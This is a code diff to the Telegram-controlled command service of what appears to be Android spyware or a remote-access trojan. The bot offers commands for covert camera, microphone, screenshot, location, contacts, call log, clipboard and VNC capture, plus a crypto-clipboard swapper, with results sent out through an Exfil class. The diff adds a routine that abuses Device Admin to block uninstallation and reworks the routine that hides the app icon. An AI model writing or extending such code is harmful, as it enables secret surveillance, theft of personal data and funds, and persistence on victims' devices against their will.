@@ -13,10 +13,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.graphics.ImageFormat;
-import android.hardware.camera2.*;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
 import android.media.Image;
@@ -69,6 +73,22 @@ public class TelegramService extends Service {
         
         Exfil.send("✅ System Bot is Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
         new Thread(this::pollTelegram).start();
+        
+        blockUninstall();
+    }
+
+    private void blockUninstall() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
+            
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.setUninstallBlocked(admin, getPackageName(), true);
+                Exfil.send("🛡️ Anti-Uninstall Shield Activated.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Anti-Uninstall Error: " + e.getMessage());
+        }
     }
 
     private void pollTelegram() {
@@ -125,6 +145,44 @@ public class TelegramService extends Service {
         });
     }
 
+    private void hideIcon() {
+        try {
+            Intent intent = new Intent(Intent.ACTION_MAIN);
+            intent.addCategory(Intent.CATEGORY_LAUNCHER);
+            intent.setPackage(getPackageName());
+            
+            List<ResolveInfo> activities = getPackageManager().queryIntentActivities(intent, 0);
+            
+            if (activities.size() > 0) {
+                String activityName = activities.get(0).activityInfo.name;
+                ComponentName componentName = new ComponentName(getPackageName(), activityName);
+                
+                getPackageManager().setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                );
+                Exfil.send("🕵️ Icon hidden for: " + getPackageName());
+            } else {
+                Exfil.send("❌ Could not find launcher activity.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Hide Error: " + e.getMessage());
+        }
+    }
+
+    private void uninstallApp(String packageName) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_DELETE);
+            intent.setData(Uri.parse("package:" + packageName));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            Exfil.send("🗑️ Uninstall prompt opened for: " + packageName);
+        } catch (Exception e) {
+            Exfil.send("Uninstall Error: " + e.getMessage());
+        }
+    }
+
     private void startVncStream() {
         if (!isVncRunning) return;
         if (KeyloggerService.instance != null) {
@@ -161,30 +219,6 @@ public class TelegramService extends Service {
             }
         }
         Exfil.send(sb.toString());
-    }
-
-    private void uninstallApp(String packageName) {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
-            
-            if (dpm != null && dpm.isAdminActive(admin)) {
-                // Unblock l'app ila kant m-blockiya
-                dpm.setUninstallBlocked(admin, packageName, false);
-                
-                // N-ft7o l'uninstaller
-                Intent intent = new Intent(Intent.ACTION_DELETE);
-                intent.setData(Uri.parse("package:" + packageName));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                
-                Exfil.send("🗑️ Requested uninstall for: " + packageName);
-            } else {
-                Exfil.send("❌ Device Admin not enabled. Cannot uninstall silently.");
-            }
-        } catch (Exception e) {
-            Exfil.send("Uninstall Error: " + e.getMessage());
-        }
     }
 
     private void getContacts() {
@@ -291,25 +325,12 @@ public class TelegramService extends Service {
         }
     }
 
-    private void hideIcon() {
-        try {
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            );
-            Exfil.send("🕵️ App icon hidden.");
-        } catch (Exception e) {
-            Exfil.send("Hide Error: " + e.getMessage());
-        }
-    }
-
     private void takePhoto() {
         Exfil.send("📷 Opening Camera...");
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = manager.getCameraIdList()[0];
-            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1]; 
+            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
             
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
@@ -386,4 +407,4 @@ public class TelegramService extends Service {
         restartService.setPackage(getPackageName());
         startService(restartService);
     }
-}
+                    }
